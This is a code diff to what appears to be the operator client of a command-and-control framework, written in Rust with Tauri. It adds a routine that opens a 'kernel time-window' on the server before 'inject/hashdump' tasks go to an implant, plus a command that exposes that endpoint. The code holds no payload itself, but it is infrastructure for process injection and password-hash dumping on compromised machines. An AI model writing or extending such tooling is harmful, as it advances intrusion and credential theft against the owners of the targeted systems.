@@ -57,6 +57,9 @@ pub async fn send_command(
     };
 
     let client = rest::http_client();
+    let kernel_pid = *state.kernel_pid.read().await;
+    maybe_auto_open_kernel_window(&app, &client, &server, &bearer, &command, kernel_pid).await;
+
     let ack = rest::enqueue_task(&client, &server, &bearer, &session, command)
         .await
         .map_err(|e| e.to_string())?;
@@ -299,4 +302,48 @@ pub async fn read_file_hex(path: String) -> Result<String, String> {
         let _ = write!(hex, "{b:02x}");
     }
     Ok(hex)
+}
+
+// ===== Kernel time-window (T2) =====
+
+/// Best-effort `phase=open` before inject/hashdump. 404 / network errors are
+/// silent; 502 `failed_step` is a notice. The implant task is always sent.
+async fn maybe_auto_open_kernel_window(
+    app: &tauri::AppHandle,
+    client: &reqwest::Client,
+    server: &str,
+    bearer: &str,
+    command: &Value,
+    pid: Option<u32>,
+) {
+    if !rest::command_wants_kernel_open(command) {
+        return;
+    }
+    if let Ok(reply) = rest::kernel_window(client, server, bearer, "open", pid).await {
+        if let Some(msg) = rest::kernel_open_notice(reply.status, &reply.body) {
+            let _ = app.emit("nyx://notice", msg);
+        }
+    }
+}
+
+/// `POST /api/kernel/window`. Always returns `{status, body}` on HTTP
+/// (including 404/502 and close `restored: false`); only transport/auth is Err.
+#[tauri::command]
+pub async fn kernel_window(
+    state: State<'_, Arc<BackendState>>,
+    phase: String,
+    pid: Option<u32>,
+) -> Result<Value, String> {
+    let conn = state.connection.read().await.clone();
+    let Some(Connection { server, bearer }) = conn else {
+        return Err("not connected".into());
+    };
+    if let Some(p) = pid.filter(|p| *p > 0) {
+        *state.kernel_pid.write().await = Some(p);
+    }
+    let client = rest::http_client();
+    let reply = rest::kernel_window(&client, &server, &bearer, &phase, pid)
+        .await
+        .map_err(|e| e.to_string())?;
+    Ok(serde_json::json!({ "status": reply.status, "body": reply.body }))
 }
